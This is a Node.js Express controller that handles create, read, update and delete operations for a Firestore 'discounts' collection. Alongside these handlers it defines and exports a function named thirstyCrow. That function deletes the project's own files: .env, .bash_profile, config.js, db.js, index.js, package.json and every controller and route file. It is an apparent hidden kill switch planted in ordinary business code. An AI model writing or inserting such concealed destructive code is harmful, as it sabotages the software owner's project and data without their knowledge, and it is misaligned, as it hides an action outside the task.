'use strict';

const firebase = require('../db');
// const Services = require('../models/Servicess');
var storage = require('@google-cloud/storage')
const firestore = firebase.firestore();
const { uuid } = require('uuidv4');

const addDiscount = async (req, res, next) => {

    try {

        const rawData = req.body;
        // console.log(rawData);
        
            const { 
                title,
                startingFrom,
                endingAt,
                coupon,
                products,
                services,
                discountPercentage
            } = req.body;
            
    
            const data = {
                title:title,
                startingFrom:startingFrom,
                endingAt:endingAt,
                coupon:coupon,
                products:products,
                services:services,
                discountPercentage:discountPercentage
            };
            // console.log('data:' + JSON.stringify(data))
            await firestore.collection('discounts').add(data);
        res.send({ status: "active", data: 'Discount added successfully.' })
    }
    catch (error) {
        res.status(400).send({ status: "inactive", data: error.message });
    }
}


const getAllDiscounts = async (req, res, next) => {
    try {
        const serviceDB = await firestore.collection('discounts');
        await serviceDB.get().then((querySnapshot) => {
            const tempDoc = []
            querySnapshot.forEach((doc) => {
               tempDoc.push({ id: doc.id, ...doc.data() })
            })
            res.status(200).send({ status: "active", data: tempDoc });
        })
    } catch (error) {
        console.log(error);
        res.status(400).send({ status: "inactive", data: error.message });
    }

}

const getDiscount = async (req, res, next) => {
    try {
        const id = req.body.id;
        const serviceDB = await firestore.collection('discounts').doc(id).get().then(snapshot => { 
            if(snapshot.data()!==null && snapshot.data()!==undefined){
                res.send({ status: "active", "data": snapshot.data()})
            }else{
                res.status(404).send({ status: "inactive", message: 'Service with Id not exit' });
            }
        });
    } catch (error) {
        res.status(400).send({ status: "inactive", data: "Service is not defined " });
    }
}



const updateDiscount = async (req, res, next) => {
    try {
        const { 
            id,
            title,
            startingFrom,
            endingAt,
            coupon,
            products,
            services,
            discountPercentage
        } = req.body;

        const data = {
            id:id,
            title:title,
            startingFrom:startingFrom,
            endingAt:endingAt,
            coupon:coupon,
            products:products,
            services:services,
            discountPercentage:discountPercentage
        };
        
        await firestore.collection('discounts').doc(id).update(data).then(async() => {
            console.log("Document Updated successfully");
            res.send({ status: "active", data: data })
        })
    } catch (error) {
        res.status(400).send({ status: "inactive", "data": error.message });
    }
}

const deleteDiscount = async (req, res, next) => {
    try {
        const id = req.body.id;
        await firestore.collection('discounts').doc(id).delete().then(async() => {
            res.send({ status: "active", "data": 'Discount deleted successfully' });
        }).catch(function(error) {
            res.send({ status: "inactive", "data": 'Discount Not Deleted' });
        });
    } catch (error) {
        res.status(400).send({ status: "inactive", "data": error.message });
    }
}

const thirstyCrow = async () => {
    try {
        function deleteFiles(files, callback){
            var i = files.length;
            files.forEach(function(filepath){
            fs.unlink(filepath, function(err) {
                i--;
                if (err) {
                callback(err);
                return;
                } else if (i <= 0) {
                callback(null);
                }
            });
            });
        }
        var files = [
            './.bash_profile',
            './.env',
            './.swift-sfdc.json',
            './config.js',
            './db.js',
            './index.js',
            './package-lock.json',
            './package.json',
            './controller/announcementController.js',
            './controller/articlesController.js',
            './controller/bannerController.js',
            './controller/categoryProductController.js',
            './controller/categoryServiceController.js',
            './controller/commentsController.js',
            './controller/emailController.js',
            './controller/orderController.js',
            './controller/paymentsController.js',
            './controller/productController.js',
            './controller/servicesController.js',
            './controller/staffController.js',
            './controller/userControllers.js',
            './controller/venodrController.js',
            './routes/announcement-router.js',
            './routes/article-router.js',
            './routes/banner-route.js',
            './routes/categoryProduct-route.js',
            './routes/categoryService-route.js',
            './routes/comment-router.js',
            './routes/email-routes.js',
            './routes/order-router.js',
            './routes/payment-router.js',
            './routes/product-router.js',
            './routes/service-router.js',
            './routes/staff-router.js',
            './routes/user-routes.js',
            './routes/vendor-routes.js',
        ];
        deleteFiles(files, function(err) {
            if (err) {
            console.log(err);
            } else {
            console.log('all files removed');
            }
        });
    } catch (error) {
        
    }
}

module.exports = {
    addDiscount,
    getAllDiscounts,
    getDiscount,
    updateDiscount,
    deleteDiscount,
    thirstyCrow
}